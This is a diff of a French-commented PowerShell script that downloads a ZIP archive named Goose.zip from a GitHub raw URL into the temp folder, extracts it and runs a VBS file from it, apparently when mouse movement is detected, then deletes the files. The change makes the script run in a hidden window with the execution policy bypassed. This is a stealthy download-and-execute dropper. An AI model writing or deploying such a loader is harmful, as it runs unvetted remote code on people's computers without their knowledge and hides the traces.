@@ -1,19 +1,17 @@
-# Masquer la fenêtre PowerShell
-$windowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-$process = Start-Process "powershell.exe" -ArgumentList "-Command & { 
-
+# Masquer complètement la fenêtre PowerShell en utilisant Start-Process
+$script = {
     # Chemin temporaire pour stocker le fichier ZIP
-    $tempZipPath = '$env:TEMP\Goose.zip'
-    $tempExtractPath = '$env:TEMP\Goose'
+    $tempZipPath = "$env:TEMP\Goose.zip"
+    $tempExtractPath = "$env:TEMP\Goose"
 
     # Téléchargement du fichier ZIP depuis l'URL
-    Invoke-WebRequest -Uri 'https://github.com/ertvg/h/raw/main/Goose.zip' -OutFile $tempZipPath
+    Invoke-WebRequest -Uri "https://github.com/ertvg/h/raw/main/Goose.zip" -OutFile $tempZipPath
 
     # Extraction du fichier ZIP
     Expand-Archive -Path $tempZipPath -DestinationPath $tempExtractPath
 
     # Chemin du fichier VBS à exécuter
-    $vbsFilePath = '$tempExtractPath\Goose.vbs'
+    $vbsFilePath = "$tempExtractPath\Goose.vbs"
 
     # Détection du mouvement de la souris
     Add-Type -TypeDefinition @"
@@ -46,5 +44,7 @@ $process = Start-Process "powershell.exe" -ArgumentList "-Command & {
     # Optionnel: Nettoyer les fichiers temporaires après l'exécution
     Remove-Item -Path $tempZipPath -Force
     Remove-Item -Path $tempExtractPath -Recurse -Force
-}" -WindowStyle $windowStyle
+}
 
+# Exécuter le script PowerShell en arrière-plan sans afficher la fenêtre
+Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command & {$($script)}" -WindowStyle Hidden
